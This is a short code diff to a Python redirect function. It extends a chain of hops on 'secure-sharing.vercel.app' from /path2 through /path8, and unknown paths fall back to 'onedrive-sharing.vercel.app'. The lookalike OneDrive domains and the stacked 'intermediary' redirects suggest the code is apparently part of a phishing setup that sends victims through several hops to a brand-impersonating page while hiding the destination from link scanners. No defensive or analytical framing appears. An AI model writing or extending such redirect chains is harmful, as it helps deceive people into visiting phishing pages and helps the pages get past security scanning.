@@ -7,7 +7,17 @@ def get_redirect_url(path):
     if path == '/path1':
         return 'https://secure-sharing.vercel.app/path2'
     elif path == '/path2':
-        return 'https://intermediary-url2.vercel.app/'
+        return 'https://secure-sharing.vercel.app/path3'
+    elif path == '/path3':
+        return 'https://secure-sharing.vercel.app/path4'
+    elif path == '/path4':
+        return 'https://secure-sharing.vercel.app/path5'
+    elif path == '/path5':
+        return 'https://secure-sharing.vercel.app/path6'
+    elif path == '/path6':
+        return 'https://secure-sharing.vercel.app/path7'
+    elif path == '/path7':
+        return 'https://secure-sharing.vercel.app/path8'
     # Add more cases for additional paths and intermediary URLs as needed
     else:
         return 'https://onedrive-sharing.vercel.app/'
